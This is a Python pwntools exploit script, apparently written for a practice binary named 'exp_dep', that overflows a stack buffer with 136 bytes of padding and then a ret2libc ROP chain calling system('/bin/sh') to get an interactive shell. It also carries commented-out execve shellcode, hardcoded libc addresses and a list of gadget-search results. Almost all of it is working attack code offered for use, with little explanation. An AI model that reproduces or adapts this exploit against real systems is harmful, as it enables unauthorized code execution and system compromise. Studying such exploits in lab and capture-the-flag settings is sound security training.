#!/usr/bin/env python
from pwn import *

#p = remote('127.0.0.1',8888) 
p = process('./exp_dep/exp_dep')
"""
ret = 0x00007ffff7a78aaa
shellcode =  "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69"
shellcode += "\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53"
shellcode += "\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0"
shellcode += "\x3b\x0f\x05"
payload = shellcode + 'A' * (136 - len(shellcode)) + p64(ret)

"""
raw_input("Any key")
pSystem = 0x7ffff7a90c70
"""
0x00007ffff7afd25d
mov rdi,[rsp]
mov rdx,rax
call xxx
mov rax,rdx
add rsp,8
cmp rax, xxx
jnb xxx
ret
"""
pRop = 0x7ffff7afd25d
pBinSh = 0x7ffff7b9d9c3

payload = 'A'*136 + p64(pRop) + p64(pBinSh) + p64(pSystem)
#system("/bin/sh")
"""
asmsearch "mov rdi,[esp]" libc

rsp -> xxx -> mov rdi,[esp]  call, lkjadfg,ret
rsp+8 -> 0x7ffff7b9d9c3 -> "/bin/sh"

0x00007ffff7a857c0 : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7aeaee1 : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7aec70b : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7afa491 : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7afd25d : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7afd2bd : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7b069ad : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7b069dd : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7b069fa : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7b07184 : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7b07447 : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7b07bb3 : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7b07c23 : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7b0f2b5 : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7b0f354 : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7b2154d : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7b216dd : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7b2173d : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7b2179d : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7b21ead : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7b27203 : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7b273ad : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7b2743d : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7b2a1cd : (488b3c24)	mov    rdi,QWORD PTR [rsp]
0x00007ffff7b2d75d : (488b3c24)	mov    rdi,QWORD PTR [rsp]

"""

p.send(payload) 
p.interactive() 
